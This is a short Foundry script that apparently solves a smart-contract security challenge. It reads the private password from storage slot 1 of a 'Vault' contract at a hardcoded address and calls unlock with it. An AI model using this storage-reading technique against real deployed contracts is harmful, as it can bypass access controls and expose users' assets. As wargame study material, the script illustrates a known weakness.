// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {Vault} from "../src/Vault.sol";

contract VaultScript is Script {
    Vault public vault;

    function setUp() public {
    }

    function run() public {
        vault = Vault(0x7e73c88caf2EB9b1B70201F9d12671A5D11a7d3A);

        vm.startBroadcast();

        bytes32 passwordSlot = vm.load(address(vault), bytes32(uint256(1)));

        vault.unlock(passwordSlot);

        console.log("Vault is locked? ", vault.locked());

        vm.stopBroadcast();
    }
}
